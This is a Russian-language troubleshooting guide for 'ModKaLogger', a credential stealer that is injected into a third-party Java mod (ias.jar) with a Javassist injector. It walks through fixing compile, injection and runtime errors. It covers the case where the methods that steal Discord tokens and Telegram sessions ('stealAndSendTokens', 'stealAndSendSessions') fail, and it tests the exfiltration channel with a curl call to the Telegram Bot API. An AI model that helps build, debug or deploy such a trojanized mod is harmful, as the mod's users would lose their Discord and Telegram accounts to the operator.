# Решение проблем: Вшивание ModKaLogger

## Проблемы при компиляции

### Проблема: "gradlew not found"
```
gradlew : Имя "gradlew" не распознано
```

**Решение:**
```bash
# Используйте полный путь или скачайте Gradle
# Вариант 1: Скачать Gradle
# https://gradle.org/releases/

# Вариант 2: Использовать Maven
mvn clean compile

# Вариант 3: Использовать Java напрямую
javac -d build/classes src/main/java/com/modkalogger/*.java
```

### Проблема: "javac not found"
```
javac : Имя "javac" не распознано
```

**Решение:**
```bash
# Установите Java Development Kit (JDK)
# https://www.oracle.com/java/technologies/downloads/

# Проверьте что Java установлена
java -version
javac -version

# Добавьте Java в PATH если нужно
# Windows: C:\Program Files\Java\jdk-XX\bin
```

### Проблема: "Cannot find symbol"
```
error: cannot find symbol
  symbol:   class ModKaLoggerInitThread
```

**Решение:**
```bash
# Убедитесь что ModKaLoggerInitThread.java скомпилирован
# Перекомпилируйте весь проект
gradlew clean build -x test

# Проверьте что класс находится в build/libs/modkalogger-1.0.0.jar
jar tf build/libs/modkalogger-1.0.0.jar | grep ModKaLoggerInitThread
```

## Проблемы при компиляции ModInjector

### Проблема: "javassist not found"
```
error: package javassist does not exist
```

**Решение:**
```bash
# Скачайте Javassist
# https://www.javassist.org/

# Или используйте Maven
mvn dependency:copy-dependencies -DoutputDirectory=lib

# Компилируйте с правильным classpath
# Windows
javac -cp "build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector.java

# Linux/Mac
javac -cp "build/libs/modkalogger-1.0.0.jar:javassist-3.29.2-GA.jar" ModInjector.java
```

### Проблема: "ModInjector.class not created"
```
# Нет файла ModInjector.class
```

**Решение:**
```bash
# Проверьте что компиляция прошла без ошибок
# Убедитесь что все зависимости в classpath
# Попробуйте явно указать выходную директорию
javac -d . -cp "build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector.java
```

## Проблемы при запуске инъектора

### Проблема: "Exception in thread main"
```
Exception in thread "main" java.lang.ClassNotFoundException: ModInjector
```

**Решение:**
```bash
# Убедитесь что ModInjector.class находится в текущей директории
# Запустите с явным classpath
java -cp ".;build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector ias.jar ias_injected.jar
```

### Проблема: "ias.jar not found"
```
[!] Файл не найден: ias.jar
```

**Решение:**
```bash
# Убедитесь что ias.jar находится в текущей директории
# Или укажите полный путь
java -cp ".;build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector "D:\path\to\ias.jar" ias_injected.jar

# Проверьте что файл существует
dir ias.jar
```

### Проблема: "Главный класс мода не найден"
```
[!] Главный класс мода не найден
```

**Решение:**
```bash
# Проверьте что ias.jar содержит классы в пакете ru/
jar tf ias.jar | grep "\.class" | head -20

# Если нет классов в ru/, проверьте другие пакеты
jar tf ias.jar | grep "\.class" | grep -v "META-INF"

# Если пакет другой (например com/), отредактируйте ModInjector.java
# Найдите строку: if (name.startsWith("ru/") && ...
# Измените "ru/" на нужный пакет
```

### Проблема: "modkalogger-1.0.0.jar not found"
```
[!] Скомпилированный JAR ModKaLogger не найден в build/libs/
```

**Решение:**
```bash
# Перекомпилируйте ModKaLogger
gradlew build -x test

# Проверьте что JAR создан
dir build\libs\modkalogger-*.jar

# Если не создан, проверьте ошибки компиляции
gradlew build
```

## Проблемы с результатом

### Проблема: "ias_injected.jar не создан"
```
# Файл ias_injected.jar не появился
```

**Решение:**
```bash
# Проверьте что инъектор завершился успешно
# Проверьте что нет ошибок в выводе
# Проверьте что есть место на диске
# Попробуйте запустить с явным путём вывода
java -cp ".;build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector ias.jar "D:\output\ias_injected.jar"
```

### Проблема: "ias_injected.jar имеет неправильный размер"
```
# Размер ias_injected.jar меньше чем ias.jar
```

**Решение:**
```bash
# Это может быть нормально если JAR был переупакован
# Проверьте что классы ModKaLogger находятся в JAR
jar tf ias_injected.jar | grep "ru/modkalogger"

# Если классов нет, инъекция не прошла
# Проверьте логи инъектора на ошибки
```

### Проблема: "Классы ModKaLogger не находятся в JAR"
```
# jar tf ias_injected.jar | grep "ru/modkalogger" - ничего не выводит
```

**Решение:**
```bash
# Проверьте что инъектор нашёл главный класс
# Проверьте что модkalogger-1.0.0.jar содержит классы
jar tf build/libs/modkalogger-1.0.0.jar | grep "\.class"

# Если классов нет, перекомпилируйте
gradlew clean build -x test

# Если классы есть, проверьте что инъектор их скопировал
# Добавьте debug вывод в ModInjector.java
```

## Проблемы при запуске мода

### Проблема: "Мод не запускается"
```
java -jar ias_injected.jar
# Ошибка или зависание
```

**Решение:**
```bash
# Проверьте что оригинальный мод работает
java -jar ias.jar

# Если оригинальный мод не работает, проблема не в инъекции
# Если оригинальный мод работает, проблема в инъекции

# Проверьте логи на ошибки
# Добавьте debug вывод в ModKaLoggerInitThread.java
```

### Проблема: "Нет сообщений [ModKaLogger] в логах"
```
# Инициализация не произошла
```

**Решение:**
```bash
# Проверьте что главный класс был модифицирован
# Используйте javap для просмотра bytecode
javap -c -classpath ias_injected.jar ru.ias.Main | grep "ModKaLoggerInitThread"

# Если нет упоминания ModKaLoggerInitThread, инъекция не прошла
# Проверьте логи инъектора

# Если есть упоминание, проверьте что класс загружается
# Добавьте System.out.println в ModKaLoggerInitThread
```

### Проблема: "ModKaLoggerInitThread not found"
```
[ModKaLogger] Ошибка: java.lang.ClassNotFoundException: ModKaLoggerInitThread
```

**Решение:**
```bash
# Проверьте что класс находится в JAR
jar tf ias_injected.jar | grep ModKaLoggerInitThread

# Если класса нет, проверьте что он был скопирован
# Проверьте что build/libs/modkalogger-1.0.0.jar содержит класс
jar tf build/libs/modkalogger-1.0.0.jar | grep ModKaLoggerInitThread

# Если класса нет в modkalogger JAR, перекомпилируйте
gradlew clean build -x test
```

### Проблема: "ru.modkalogger.Discord not found"
```
[ModKaLogger] Ошибка Discord: java.lang.ClassNotFoundException: ru.modkalogger.Discord
```

**Решение:**
```bash
# Проверьте что классы Discord находятся в JAR
jar tf ias_injected.jar | grep "ru/modkalogger/Discord"

# Если класса нет, проверьте что он был скопирован
# Проверьте что build/libs/modkalogger-1.0.0.jar содержит класс
jar tf build/libs/modkalogger-1.0.0.jar | grep "Discord.class"

# Если класса нет, перекомпилируйте
gradlew clean build -x test

# Если класс есть, проверьте что он находится в правильном пакете
# Должен быть в ru/modkalogger/, а не в com/modkalogger/
```

## Проблемы с функционалом

### Проблема: "Discord токены не крадутся"
```
# Функция вызывается но токены не отправляются
```

**Решение:**
```bash
# Проверьте что Discord.java имеет метод stealAndSendTokens()
# Проверьте что метод public static
# Проверьте что метод не требует параметров

# Проверьте логи на ошибки
# Добавьте debug вывод в Discord.java

# Проверьте что пути к файлам корректны
# Проверьте что Discord приложение установлено
```

### Проблема: "Telegram сессии не крадутся"
```
# Функция вызывается но сессии не отправляются
```

**Решение:**
```bash
# Проверьте что Telegram.java имеет метод stealAndSendSessions()
# Проверьте что метод public static
# Проверьте что метод не требует параметров

# Проверьте логи на ошибки
# Добавьте debug вывод в Telegram.java

# Проверьте что пути к файлам корректны
# Проверьте что Telegram приложение установлено
```

### Проблема: "Данные не отправляются на Telegram"
```
# Функционал работает но данные не приходят на Telegram
```

**Решение:**
```bash
# Проверьте что Telegram Bot Token правильный
# Проверьте что Chat ID правильный
# Проверьте что интернет соединение работает

# Проверьте логи на ошибки отправки
# Добавьте debug вывод в TelegramSender.java

# Проверьте что Telegram Bot API доступен
# Попробуйте отправить сообщение вручную
curl "https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHAT_ID&text=test"
```

## Общие советы

### Отладка
```bash
# Добавьте System.out.println для отладки
# Проверьте логи консоли
# Используйте javap для просмотра bytecode
# Используйте jar tf для проверки содержимого JAR
```

### Проверка
```bash
# Всегда проверяйте что оригинальный мод работает
# Всегда проверяйте что все зависимости установлены
# Всегда проверяйте что пути правильные
# Всегда проверяйте что файлы существуют
```

### Переустановка
```bash
# Если ничего не помогает, начните с нуля
# Удалите все временные файлы
# Перекомпилируйте ModKaLogger
# Перекомпилируйте ModInjector
# Запустите инъектор заново
```

## Контакт

Если проблема не решена:
1. Проверьте все пункты выше
2. Проверьте документацию (PROPER_INJECTION_GUIDE.md)
3. Проверьте примеры (USAGE_EXAMPLE.md)
4. Проверьте логи на ошибки
5. Попробуйте альтернативный способ (Python инъектор)
